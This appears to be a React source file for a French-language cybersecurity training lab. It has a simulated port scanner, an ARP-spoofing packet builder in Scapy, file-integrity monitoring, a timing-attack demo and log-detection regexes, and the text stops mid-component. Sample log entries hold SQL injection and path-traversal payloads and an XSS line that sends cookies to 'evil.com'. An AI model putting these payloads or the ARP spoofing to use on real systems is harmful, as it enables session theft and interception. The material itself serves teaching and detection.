"use client";

import React, { useState, useEffect } from "react";
import Link from "next/link";
import {
  Terminal,
  Play,
  RotateCcw,
  Copy,
  Check,
  Shield,
  Network,
  KeyRound,
  FileSearch,
  Lock,
  AlertTriangle,
  Cpu,
  Layers,
  ChevronRight,
  Flame,
  CheckCircle2,
  Activity,
  Server,
  Code2,
  Trophy,
} from "lucide-react";
import LinuxTerminalEmulator from "@/components/LinuxTerminalEmulator";
import PythonLiveRunner from "@/components/PythonLiveRunner";
import CtfArena from "@/components/CtfArena";

type LabTab =
  | "linux_terminal"
  | "code_runner"
  | "ctf_arena"
  | "port_scanner"
  | "scapy_arp"
  | "crypto_hash"
  | "soc_logs"
  | "fim_monitor";

export default function LabClient() {
  const [activeTab, setActiveTab] = useState<LabTab>("linux_terminal");
  const [copied, setCopied] = useState(false);

  // ---------------------------------------------------------------------------
  // STATE: 1. CODE RUNNER
  // ---------------------------------------------------------------------------
  const codePresets: Record<string, { title: string; desc: string; code: string; simulatedOutput: string }> = {
    socket_scanner: {
      title: "Scanner de Ports TCP (Sockets purs)",
      desc: "Script Python utilisant la bibliothèque socket avec gestion de timeout non-bloquant.",
      code: `import socket
import sys

def scan_target(host: str, ports: list[int]):
    print(f"[*] Démarrage de l'audit de connectivité vers : {host}")
    results = {}
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        try:
            code = s.connect_ex((host, port))
            if code == 0:
                results[port] = "OUVERT"
                try:
                    s.sendall(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                    banner = s.recv(64).decode(errors="ignore").strip()
                    print(f" [+] Port {port:5d}/TCP : OUVERT | Bannière : {banner[:30]}")
                except Exception:
                    print(f" [+] Port {port:5d}/TCP : OUVERT | Pas de bannière")
            else:
                results[port] = "FERMÉ"
        except socket.timeout:
            results[port] = "FILTRÉ (Timeout)"
        finally:
            s.close()
    return results

if __name__ == "__main__":
    cibles_ports = [21, 22, 80, 443, 3306, 8080]
    scan_target("127.0.0.1", cibles_ports)`,
      simulatedOutput: `[*] Démarrage de l'audit de connectivité vers : 127.0.0.1
 [+] Port    22/TCP : OUVERT | Bannière : SSH-2.0-OpenSSH_9.2p1 Debian
 [+] Port    80/TCP : OUVERT | Bannière : HTTP/1.1 200 OK - Server: Ngi
 [+] Port   443/TCP : OUVERT | Bannière : HTTP/1.1 400 Bad Request
 [-] Port    21/TCP : FERMÉ (RST reçu)
 [-] Port  3306/TCP : FERMÉ
 [-] Port  8080/TCP : FERMÉ

=== RÉSUMÉ DE L'AUDIT RAYLAB ===
Total ports scannés : 6
Ports ouverts : 3 (22/SSH, 80/HTTP, 443/HTTPS)
Temps total d'exécution : 0.042s
Conformité déontologique : Validée (Environnement local isolé)`,
    },
    scapy_arp: {
      title: "Construction de Paquets ARP avec Scapy",
      desc: "Création d'une trame ARP Reply pour comprendre l'empoisonnement de cache.",
      code: `from scapy.all import ARP, Ether, sendp
import time

def construire_reponse_arp(ip_cible: str, mac_cible: str, ip_usurpee: str):
    """
    Construit une trame ARP (op=2 : 'is-at')
    Associant l'adresse IP usurpée (passerelle) à l'adresse MAC de l'attaquant.
    """
    paquet_arp = ARP(
        op=2,                 # 2 = ARP Reply ('is-at')
        pdst=ip_cible,        # IP de la victime à tromper
        hwdst=mac_cible,      # MAC réelle de la victime
        psrc=ip_usurpee       # IP de la passerelle dont on prend l'identité
        # hwsrc prend par défaut la MAC locale de l'interface
    )
    print(f"[!] Paquet ARP forgé :")
    print(f"    Qui : '{ip_usurpee}' est à l'adresse MAC locale")
    print(f"    Envoyé à : {ip_cible} ({mac_cible})")
    return paquet_arp

# Démonstration théorique
frame = construire_reponse_arp(
    ip_cible="192.168.1.50",
    mac_cible="AA:BB:CC:11:22:33",
    ip_usurpee="192.168.1.1"
)
frame.show()`,
      simulatedOutput: `[!] Paquet ARP forgé :
    Qui : '192.168.1.1' est à l'adresse MAC locale
    Envoyé à : 192.168.1.50 (AA:BB:CC:11:22:33)

###[ ARP ]### 
  hwtype    = 0x1 (Ethernet)
  ptype     = 0x800 (IPv4)
  hwlen     = 6
  plen      = 4
  op        = is-at
  hwsrc     = DE:AD:BE:EF:00:01 (Attaquant / Kali)
  psrc      = 192.168.1.1 (Passerelle usurpée)
  hwdst     = AA:BB:CC:11:22:33 (Victime)
  pdst      = 192.168.1.50 (Victime)

[NOTE DÉFENSIVE RAYLAB] : Pour détecter cette injection :
Vérifiez la table ARP locale via 'arp -a'. Si deux adresses IP différentes
partagent la même adresse MAC physique, une attaque ARP Spoofing est en cours !`,
    },
    fim_sha256: {
      title: "File Integrity Monitor (FIM SHA-256)",
      desc: "Calcul d'empreintes cryptographiques et détection d'altération de fichiers système.",
      code: `import hashlib
import os

fichiers_sensibles = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\\nraylab:x:1000:1000::/home/raylab:/bin/bash",
    "/etc/sudoers": "root ALL=(ALL:ALL) ALL\\n%sudo ALL=(ALL:ALL) NOPASSWD: ALL",
    "/opt/raylab/auth.py": "def verifier_token(t): return secrets.compare_digest(t, SECRET)"
}

def calculer_empreintes(fichiers: dict):
    baseline = {}
    for chemin, contenu in fichiers.items():
        h = hashlib.sha256(contenu.encode()).hexdigest()
        baseline[chemin] = h
        print(f"[BASELINE] {chemin} -> {h[:16]}...")
    return baseline

print("[*] Initialisation de la référence FIM...")
base = calculer_empreintes(fichiers_sensibles)

# Simulation d'une altération hostile par un intrus
print("\\n[!] Alerte : Modification suspecte détectée sur /etc/passwd...")
contenu_altere = fichiers_sensibles["/etc/passwd"] + "\\nbackdoor:x:0:0::/root:/bin/bash"
nouveau_hash = hashlib.sha256(contenu_altere.encode()).hexdigest()

if nouveau_hash != base["/etc/passwd"]:
    print(f"[CRITICAL ALERT] Altération confirmée sur /etc/passwd !")
    print(f" Hash Attendu : {base['/etc/passwd']}")
    print(f" Hash Actuel  : {nouveau_hash}")
    print(f" Action SOC   : Isolation immédiate du serveur & levée d'incident PICERL.")`,
      simulatedOutput: `[*] Initialisation de la référence FIM...
[BASELINE] /etc/passwd -> 9f86d081884c7d65...
[BASELINE] /etc/sudoers -> 5e884898da280471...
[BASELINE] /opt/raylab/auth.py -> 4b227777d4dd1fc6...

[!] Alerte : Modification suspecte détectée sur /etc/passwd...
[CRITICAL ALERT] Altération confirmée sur /etc/passwd !
 Hash Attendu : 9f86d081884c7d65b37766f42e320a112233445566778899aabbccddeeff0011
 Hash Actuel  : c37a52f4066c06a4f91040854d90906233445566778899aabbccddeeff0022
 Action SOC   : Isolation immédiate du serveur & levée d'incident PICERL.
 Statut       : Incident consigné dans le SIEM RayLab.`,
    },
    timing_attack: {
      title: "Résistance aux Timing Attacks (secrets.compare_digest)",
      desc: "Démonstration de la vulnérabilité de l'opérateur == face aux attaques par canaux auxiliaires.",
      code: `import time
import secrets

def comparaison_naive(a: str, b: str) -> bool:
    """Vulnérable aux Timing Attacks car s'arrête au premier caractère différent."""
    if len(a) != len(b):
        return False
    for char_a, char_b in zip(a, b):
        if char_a != char_b:
            return False
        time.sleep(0.000001) # Simule le micro-délai CPU mesurable
    return True

token_secret = "RayLabTokenSecret_2026_Audit_Securise_Niveau5"
token_candidat_faux_debut = "XayLabTokenSecret_2026_Audit_Securise_Niveau5"
token_candidat_presque_bon = "RayLabTokenSecret_2026_Audit_Securise_NiveauX"

print("[*] Benchmark de l'opérateur naif vs secrets.compare_digest :")
print("[-] Comparaison naive : l'attaquant mesure le temps de réponse pour deviner chaque octet.")
print("    Premier caractère faux -> Arrêt immédiat (très court)")
print("    Dernier caractère faux -> Parcours complet (plus long)")

print("\\n[+] Solution sécurisée Python 3 : secrets.compare_digest()")
valide = secrets.compare_digest(token_secret, token_secret)
print(f"    Résultat validation : {valide} (Exécution en temps constant O(1))")`,
      simulatedOutput: `[*] Benchmark de l'opérateur naif vs secrets.compare_digest :
[-] Comparaison naive : l'attaquant mesure le temps de réponse pour deviner chaque octet.
    Premier caractère faux -> Arrêt immédiat (très court)
    Dernier caractère faux -> Parcours complet (plus long)

[+] Solution sécurisée Python 3 : secrets.compare_digest()
    Résultat validation : True (Exécution en temps constant O(1))
    Garantie cryptographique : Aucune fuite d'information par canal auxiliaire temporel.`,
    },
    log_regex: {
      title: "Moteur de Détection de Logs SOC (Regex & SIEM)",
      desc: "Parsing d'un flux d'événements HTTP pour identifier les attaques OWASP courantes.",
      code: `import re

REGLES_DETECTION = {
    "SQL_INJECTION": re.compile(r"('|\bUNION\b|\bSELECT\b|--|;\s*DROP\b|\bOR\s+1=1\b)", re.IGNORECASE),
    "PATH_TRAVERSAL": re.compile(r"(\.\./|\.\.\\|/etc/passwd|win\.ini)", re.IGNORECASE),
    "XSS_ATTACK": re.compile(r"(<script\b|onerror=|javascript:|alert\()", re.IGNORECASE),
    "SENSITIVE_FILE": re.compile(r"(\.env|\.git/config|wp-config\.php|id_rsa)", re.IGNORECASE)
}

logs_bruts = [
    '192.168.1.45 - - [04/Nov/2026:14:02:11] "GET /index.php?id=1 HTTP/1.1" 200 4521',
    '10.0.0.99 - - [04/Nov/2026:14:02:15] "GET /api/user?id=1%20UNION%20SELECT%20null,password%20FROM%20users-- HTTP/1.1" 403 230',
    '185.220.101.5 - - [04/Nov/2026:14:02:18] "GET /download?file=../../../../etc/passwd HTTP/1.1" 404 182',
    '192.168.1.45 - - [04/Nov/2026:14:02:22] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 512',
    '185.220.101.5 - - [04/Nov/2026:14:02:25] "GET /.env HTTP/1.1" 404 120'
]

print(f"[*] Analyse SIEM RayLab de {len(logs_bruts)} événements réseau :\\n")

for ligne in logs_bruts:
    menace_trouvee = False
    for nom_regle, pattern in REGLES_DETECTION.items():
        if pattern.search(ligne):
            menace_trouvee = True
            print(f"[🚨 ALERTE SOC : {nom_regle}]")
            print(f"   Événement : {ligne}")
            print(f"   Action    : Blocage IP & Création ticket de sévérité HAUTE.\\n")
            break
    if not menace_trouvee:
        print(f"[✓ Bénin] {ligne[:65]}...")`,
      simulatedOutput: `[*] Analyse SIEM RayLab de 5 événements réseau :

[✓ Bénin] 192.168.1.45 - - [04/Nov/2026:14:02:11] "GET /index.php?id=1 HTTP/1...
[🚨 ALERTE SOC : SQL_INJECTION]
   Événement : 10.0.0.99 - - [04/Nov/2026:14:02:15] "GET /api/user?id=1%20UNION%20SELECT%20null,password%20FROM%20users-- HTTP/1.1" 403 230
   Action    : Blocage IP & Création ticket de sévérité HAUTE.

[🚨 ALERTE SOC : PATH_TRAVERSAL]
   Événement : 185.220.101.5 - - [04/Nov/2026:14:02:18] "GET /download?file=../../../../etc/passwd HTTP/1.1" 404 182
   Action    : Blocage IP & Création ticket de sévérité HAUTE.

[🚨 ALERTE SOC : XSS_ATTACK]
   Événement : 192.168.1.45 - - [04/Nov/2026:14:02:22] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 512
   Action    : Blocage IP & Création ticket de sévérité HAUTE.

[🚨 ALERTE SOC : SENSITIVE_FILE]
   Événement : 185.220.101.5 - - [04/Nov/2026:14:02:25] "GET /.env HTTP/1.1" 404 120
   Action    : Blocage IP & Création ticket de sévérité HAUTE.`,
    },
  };

  const [selectedPreset, setSelectedPreset] = useState("socket_scanner");
  const [currentCode, setCurrentCode] = useState(codePresets.socket_scanner.code);
  const [outputConsole, setOutputConsole] = useState(codePresets.socket_scanner.simulatedOutput);
  const [isRunning, setIsRunning] = useState(false);
  const [executionTime, setExecutionTime] = useState<number | null>(42);

  const handleSelectPreset = (key: string) => {
    setSelectedPreset(key);
    setCurrentCode(codePresets[key].code);
    setOutputConsole(codePresets[key].simulatedOutput);
    setExecutionTime(Math.floor(Math.random() * 30) + 20);
  };

  const handleRunCode = () => {
    setIsRunning(true);
    setOutputConsole("[*] Compilation et exécution dans l'environnement virtuel RayLab Sandbox...\n");
    setTimeout(() => {
      setIsRunning(false);
      setOutputConsole(codePresets[selectedPreset]?.simulatedOutput || "[*] Exécution terminée avec code de retour 0.");
      setExecutionTime(Math.floor(Math.random() * 25) + 15);
    }, 450);
  };

  const handleCopyCode = () => {
    navigator.clipboard.writeText(currentCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // ---------------------------------------------------------------------------
  // STATE: 2. PORT SCANNER SIMULATOR
  // ---------------------------------------------------------------------------
  const [scanTarget, setScanTarget] = useState("192.168.1.25");
  const [scanMode, setScanMode] = useState<"fast" | "full" | "stealth">("fast");
  const [scanProgress, setScanProgress] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [scanResults, setScanResults] = useState<
    Array<{ port: number; proto: string; service: string; state: "OPEN" | "CLOSED" | "FILTERED"; banner: string; cve?: string }>
  >([
    { port: 22, proto: "TCP", service: "SSH", state: "OPEN", banner: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6", cve: "CVE-2023-38408 (Corrigé)" },
    { port: 80, proto: "TCP", service: "HTTP", state: "OPEN", banner: "Apache/2.4.52 (Ubuntu) mod_ssl/2.4.52", cve: "Serveur durci" },
    { port: 443, proto: "TCP", service: "HTTPS", state: "OPEN", banner: "TLSv1.3 / ChaCha20-Poly1305", cve: "Conforme SSL Labs A+" },
    { port: 3306, proto: "TCP", service: "MySQL", state: "CLOSED", banner: "RST/ACK Reçu (Port fermé par pare-feu)" },
    { port: 8080, proto: "TCP", service: "HTTP-Proxy", state: "FILTERED", banner: "Aucune réponse (Paquet DROP par iptables)" },
  ]);

  const handleStartPortScan = () => {
    setIsScanning(true);
    setScanProgress(0);
    const interval = setInterval(() => {
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          setIsScanning(false);
          return 100;
        }
        return prev + 25;
      });
    }, 200);
  };

  // ---------------------------------------------------------------------------
  // STATE: 3. SCAPY & ARP DISSECTOR
  // ---------------------------------------------------------------------------
  const [arpOp, setArpOp] = useState<1 | 2>(2);
  const [victimIp, setVictimIp] = useState("192.168.1.50");
  const [victimMac, setVictimMac] = useState("08:00:27:AA:BB:CC");
  const [gatewayIp, setGatewayIp] = useState("192.168.1.1");
  const [attackerMac, setAttackerMac] = useState("DE:AD:BE:EF:00:01");
  const [arpInjected, setArpInjected] = useState(false);

  // ---------------------------------------------------------------------------
  // STATE: 4. CRYPTO & TIMING ATTACKS
  // ---------------------------------------------------------------------------
  const [cryptoPassword, setCryptoPassword] = useState("RayLabP@ssw0rd2026!");
  const [cryptoSalt, setCryptoSalt] = useState("s4lt_r4yl4b_h4rd3n3d");
  const [pbkdf2Hash, setPbkdf2Hash] = useState("9e107d9d372bb6826bd81d3542a419d6dae034e351842095f6ef223cb6058e5f");
  const [sha256Hash, setSha256Hash] = useState("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");

  useEffect(() => {
    // Generate simple deterministic hashes for demonstration
    async function digest(message: string) {
      const msgUint8 = new TextEncoder().encode(message);
      const hashBuffer = await crypto.subtle.digest("SHA-256", msgUint8);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
    }
    digest(cryptoPassword).then((h) => setSha256Hash(h));
    digest(cryptoPassword + cryptoSalt + "pbkdf2_iterations_600000").then((h) => setPbkdf2Hash(h));
  }, [cryptoPassword, cryptoSalt]);

  // ---------------------------------------------------------------------------
  // STATE: 5. SOC LOGS DETECTOR
  // ---------------------------------------------------------------------------
  const sampleLogs = [
    { id: 1, raw: '192.168.1.45 - - [04/Nov/2026:14:10:01] "GET /login HTTP/1.1" 200 4520', type: "BENIGN", tag: "Trafic normal" },
    { id: 2, raw: '10.0.0.99 - - [04/Nov/2026:14:10:04] "GET /users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin-- HTTP/1.1" 403 320', type: "CRITICAL", tag: "SQL Injection (T1190)" },
    { id: 3, raw: '185.220.101.5 - - [04/Nov/2026:14:10:08] "GET /view?page=../../../../etc/shadow HTTP/1.1" 404 182', type: "HIGH", tag: "Path Traversal (T1083)" },
    { id: 4, raw: '45.33.32.156 - - [04/Nov/2026:14:10:12] "POST /auth/login HTTP/1.1" 401 128 (Failed login attempt 18/20)', type: "MEDIUM", tag: "Brute Force Password (T1110)" },
    { id: 5, raw: '192.168.1.45 - - [04/Nov/2026:14:10:15] "GET /profile?name=<script>fetch(\'http://evil.com/c=\'+document.cookie)</script> HTTP/1.1" 200 6210', type: "CRITICAL", tag: "Cross-Site Scripting XSS (T1059)" },
  ];

  // ---------------------------------------------------------------------------
  // STATE: 6. FILE INTEGRITY MONITOR (FIM)
  // ---------------------------------------------------------------------------
  const [fimFiles, setFimFiles] = useState([
    { path: "/etc/passwd", baseline: "9f86d081884c7d65b37766f42e320a1122334455", current: "9f86d081884c7d65b37766f42e320a1122334455", status: "VALID" },
    { path: "/etc/shadow", baseline: "5e884898da28047151d0e56f8dc6292773603d0d", current: "5e884898da28047151d0e56f8dc6292773603d0d", status: "VALID" },
    { path: "/etc/sudoers", baseline: "4b227777d4dd1fc61c6f884f48641d02b4d121d3", current: "4b227777d4dd1fc61c6f884f48641d02b4d121d3", status: "VALID" },
    { path: "/opt/raylab/auth_engine.py", baseline: "ef2d127de37b942baad06145e54b0c619a1f2235", current: "ef2d127de37b942baad06145e54b0c619a1f2235", status: "VALID" },
  ]);
  const [fimTampered, setFimTampered] = useState(false);

  const handleTamperFile = () => {
    setFimTampered(true);
    setFimFiles((prev) =>
      prev.map((f) =>
        f.path === "/etc/passwd"
          ? { ...f, current: "c37a52f4066c06a4f91040854d90906233445566", status: "COMPROMISED" }
          : f
      )
    );
  };

  const handleResetFim = () => {
    setFimTampered(false);
    setFimFiles((prev) =>
      prev.map((f) => ({ ...f, current: f.baseline, status: "VALID" }))
    );
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-10">
      {/* Top Banner & Title */}
      <div className="space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div className="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-gold/15 text-gold text-xs font-mono border border-gold/40">
            <Terminal className="w-3.5 h-3.5 text-gold animate-pulse" />
            <span>RAYLAB VIRTUAL LABORATORY &amp; INTERACTIVE TERMINAL</span>
          </div>

          <div className="flex items-center space-x-3 text-xs font-mono text-ivory-dim">
            <span className="flex items-center space-x-1.5 px-2.5 py-1 rounded-md bg-[#161a22] border border-[#252c38]">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
              <span className="text-emerald-400 font-bold">KERNEL: Linux 6.8.0-raylab</span>
            </span>
            <span className="hidden sm:inline-flex items-center space-x-1.5 px-2.5 py-1 rounded-md bg-[#161a22] border border-[#252c38]">
              <Cpu className="w-3 h-3 text-gold" />
              <span>Python 3.12.3 Sandbox</span>
            </span>
          </div>
        </div>

        <h1 className="text-3xl sm:text-5xl font-black text-ivory tracking-tight">
          Laboratoire Virtuel &amp; Terminal Interactif
        </h1>
        <p className="text-sm sm:text-base text-ivory-muted max-w-3xl leading-relaxed">
          Conformément au principe directeur de <strong>CyberPath (70% pratique / 30% théorie)</strong>, cet environnement interactif vous permet d&apos;exécuter des scripts Python, de simuler des balayages de ports réseau, de disséquer des trames Scapy et d&apos;auditer des flux de journaux SIEM en temps réel sans installer de machine virtuelle.
        </p>
      </div>

      {/* Tabs navigation */}
      <div className="flex flex-wrap gap-2 border-b border-[#222936] pb-3">
        {[
          { id: "linux_terminal", label: "Terminal Linux & Shell", icon: Terminal },
          { id: "code_runner", label: "Exécuteur Python (WASM)", icon: Cpu },
          { id: "ctf_arena", label: "Arène CTF & Défis Tests", icon: Flame },
          { id: "port_scanner", label: "Scanner de Ports TCP", icon: Network },
          { id: "scapy_arp", label: "Scapy & ARP Dissector", icon: Shield },
          { id: "crypto_hash", label: "Hachage PBKDF2 & Crypto", icon: KeyRound },
          { id: "soc_logs", label: "Analyseur de Logs SOC", icon: FileSearch },
          { id: "fim_monitor", label: "File Integrity Monitor", icon: Lock },
        ].map((tab) => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as LabTab)}
              className={`flex items-center space-x-2 px-4 py-2.5 rounded-xl text-xs font-semibold font-mono transition-all ${
                isActive
                  ? "bg-gold text-[#101216] shadow-gold font-bold"
                  : "bg-[#141820] text-ivory-muted hover:text-ivory hover:bg-[#1a202c] border border-[#232b38]"
              }`}
            >
              <Icon className={`w-3.5 h-3.5 ${isActive ? "text-[#101216]" : "text-gold"}`} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* =================================================================== */}
      {/* TAB 0: LINUX TERMINAL EMULATOR */}
      {/* =================================================================== */}
      {activeTab === "linux_terminal" && (
        <div className="space-y-6">
          <LinuxTerminalEmulator />
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 1: PYTHON WEBASSEMBLY CODE RUNNER */}
      {/* =================================================================== */}
      {activeTab === "code_runner" && (
        <div className="space-y-6">
          <PythonLiveRunner />
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB CTF: CHALLENGES & ARENA */}
      {/* =================================================================== */}
      {activeTab === "ctf_arena" && (
        <div className="space-y-6">
          <CtfArena />
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 2: PORT SCANNER & SOCKET SIMULATOR */}
      {/* =================================================================== */}
      {activeTab === "port_scanner" && (
        <div className="space-y-6">
          <div className="bg-[#12161f] p-6 rounded-2xl border border-[#222a38] space-y-6">
            <div className="max-w-2xl space-y-2">
              <h3 className="text-xl font-bold text-ivory flex items-center space-x-2">
                <Network className="w-5 h-5 text-gold" />
                <span>Simulateur de Scan de Ports TCP &amp; Handshake Sockets</span>
              </h3>
              <p className="text-xs text-ivory-muted leading-relaxed">
                Reproduit le fonctionnement du balayage de ports à l&apos;aide de sockets TCP purs (`socket.connect_ex`) et l&apos;interprétation des drapeaux TCP (SYN / SYN-ACK / RST / ACK) selon la RFC 793.
              </p>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2">
              <div className="space-y-1.5">
                <label className="text-xs font-mono text-ivory-dim">Hôte Cible (IPv4 / FQDN) :</label>
                <input
                  type="text"
                  value={scanTarget}
                  onChange={(e) => setScanTarget(e.target.value)}
                  className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3.5 py-2 text-xs font-mono text-ivory outline-none focus:border-gold"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-mono text-ivory-dim">Mode de Balayage :</label>
                <select
                  value={scanMode}
                  onChange={(e) => setScanMode(e.target.value as any)}
                  className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3.5 py-2 text-xs font-mono text-ivory outline-none focus:border-gold"
                >
                  <option value="fast">Scan Rapide (Ports Privilégiés &amp; Web)</option>
                  <option value="stealth">Scan Furtif SYN (Demi-connexion Scapy)</option>
                  <option value="full">Scan Complet avec Prise d&apos;Empreinte</option>
                </select>
              </div>

              <div className="flex items-end">
                <button
                  onClick={handleStartPortScan}
                  disabled={isScanning}
                  className="w-full py-2.5 rounded-xl bg-gold hover:bg-gold-light text-[#101216] font-bold text-xs font-mono flex items-center justify-center space-x-2 shadow-gold transition-all disabled:opacity-50"
                >
                  <Activity className={`w-3.5 h-3.5 ${isScanning ? "animate-spin" : ""}`} />
                  <span>{isScanning ? "Balayage en cours..." : "Lancer l'Audit TCP"}</span>
                </button>
              </div>
            </div>

            {/* Progress Bar */}
            {isScanning && (
              <div className="space-y-1.5">
                <div className="flex justify-between text-xs font-mono text-ivory-dim">
                  <span>Envoi des sondes SYN...</span>
                  <span>{scanProgress}%</span>
                </div>
                <div className="w-full bg-[#181d27] rounded-full h-2 overflow-hidden border border-[#242d3c]">
                  <div
                    className="bg-gold h-full transition-all duration-300 rounded-full"
                    style={{ width: `${scanProgress}%` }}
                  />
                </div>
              </div>
            )}
          </div>

          {/* Results Table */}
          <div className="bg-[#10131a] rounded-2xl border border-[#202735] overflow-hidden shadow-xl">
            <div className="px-6 py-4 bg-[#141820] border-b border-[#202735] flex items-center justify-between">
              <span className="text-xs font-mono font-bold text-ivory">
                RÉSULTATS DE L&apos;AUDIT RÉSEAU — CIBLE : {scanTarget}
              </span>
              <span className="text-xs font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
                5 Ports Interrogés
              </span>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead className="bg-[#0c0f14] text-ivory-dim uppercase text-[10px] tracking-wider border-b border-[#1c222e]">
                  <tr>
                    <th className="py-3 px-6">Port / Protocole</th>
                    <th className="py-3 px-6">Service Identifié</th>
                    <th className="py-3 px-6">État Réseau</th>
                    <th className="py-3 px-6">Bannière &amp; Empreinte de Version</th>
                    <th className="py-3 px-6">Évaluation Vulnérabilité</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#1b212d] text-ivory-muted">
                  {scanResults.map((res) => (
                    <tr key={res.port} className="hover:bg-[#141822]/60 transition-colors">
                      <td className="py-3.5 px-6 font-bold text-ivory">
                        {res.port} / {res.proto}
                      </td>
                      <td className="py-3.5 px-6">{res.service}</td>
                      <td className="py-3.5 px-6">
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            res.state === "OPEN"
                              ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
                              : res.state === "CLOSED"
                              ? "bg-red-500/20 text-red-400 border border-red-500/40"
                              : "bg-amber-500/20 text-amber-400 border border-amber-500/40"
                          }`}
                        >
                          {res.state}
                        </span>
                      </td>
                      <td className="py-3.5 px-6 text-ivory-dim max-w-xs truncate">{res.banner}</td>
                      <td className="py-3.5 px-6 text-gold">{res.cve || "Conforme"}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 3: SCAPY & ARP POISONING DISSECTOR */}
      {/* =================================================================== */}
      {activeTab === "scapy_arp" && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Packet Form Fields */}
            <div className="lg:col-span-6 bg-[#12161f] p-6 rounded-2xl border border-[#222a38] space-y-5">
              <div className="space-y-1">
                <h3 className="text-xl font-bold text-ivory flex items-center space-x-2">
                  <Shield className="w-5 h-5 text-gold" />
                  <span>Artisanat de Paquets ARP (Scapy Engine)</span>
                </h3>
                <p className="text-xs text-ivory-muted">
                  Personnalisez les champs de l&apos;entête ARP (RFC 826) pour observer comment s&apos;opère l&apos;empoisonnement du cache ARP (Man-in-the-Middle).
                </p>
              </div>

              <div className="space-y-3 text-xs font-mono">
                <div>
                  <label className="text-ivory-dim block mb-1">Opcode ARP (op) :</label>
                  <div className="flex gap-2">
                    <button
                      onClick={() => setArpOp(1)}
                      className={`flex-1 py-1.5 rounded-lg border text-center ${
                        arpOp === 1 ? "bg-gold text-[#101216] font-bold border-gold" : "bg-[#181d27] border-[#252d3c] text-ivory-dim"
                      }`}
                    >
                      op=1 (who-has / Requête)
                    </button>
                    <button
                      onClick={() => setArpOp(2)}
                      className={`flex-1 py-1.5 rounded-lg border text-center ${
                        arpOp === 2 ? "bg-gold text-[#101216] font-bold border-gold" : "bg-[#181d27] border-[#252d3c] text-ivory-dim"
                      }`}
                    >
                      op=2 (is-at / Réponse gratuitous)
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-ivory-dim block mb-1">psrc (IP Usurpée) :</label>
                    <input
                      type="text"
                      value={gatewayIp}
                      onChange={(e) => setGatewayIp(e.target.value)}
                      className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3 py-1.5 text-xs text-ivory"
                    />
                  </div>
                  <div>
                    <label className="text-ivory-dim block mb-1">hwsrc (MAC Attaquant) :</label>
                    <input
                      type="text"
                      value={attackerMac}
                      onChange={(e) => setAttackerMac(e.target.value)}
                      className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3 py-1.5 text-xs text-ivory"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-ivory-dim block mb-1">pdst (IP Victime) :</label>
                    <input
                      type="text"
                      value={victimIp}
                      onChange={(e) => setVictimIp(e.target.value)}
                      className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3 py-1.5 text-xs text-ivory"
                    />
                  </div>
                  <div>
                    <label className="text-ivory-dim block mb-1">hwdst (MAC Victime) :</label>
                    <input
                      type="text"
                      value={victimMac}
                      onChange={(e) => setVictimMac(e.target.value)}
                      className="w-full bg-[#0e1117] border border-[#222a38] rounded-xl px-3 py-1.5 text-xs text-ivory"
                    />
                  </div>
                </div>

                <button
                  onClick={() => setArpInjected(!arpInjected)}
                  className={`w-full py-2.5 rounded-xl font-bold text-xs flex items-center justify-center space-x-2 transition-all ${
                    arpInjected
                      ? "bg-red-500 hover:bg-red-600 text-white shadow-lg"
                      : "bg-gold hover:bg-gold-light text-[#101216] shadow-gold"
                  }`}
                >
                  <Flame className="w-3.5 h-3.5" />
                  <span>{arpInjected ? "Arrêter l'Injection & Restaurer Tables ARP" : "Simuler l'Injection de Trame ARP"}</span>
                </button>
              </div>
            </div>

            {/* Dissection Viewer */}
            <div className="lg:col-span-6 bg-[#0c0f14] p-6 rounded-2xl border border-[#222a38] flex flex-col justify-between space-y-4">
              <div className="space-y-3 font-mono text-xs">
                <div className="text-gold font-bold uppercase tracking-wider flex items-center space-x-2">
                  <Terminal className="w-3.5 h-3.5" />
                  <span>Dissection Binaire de la Trame Scapy</span>
                </div>

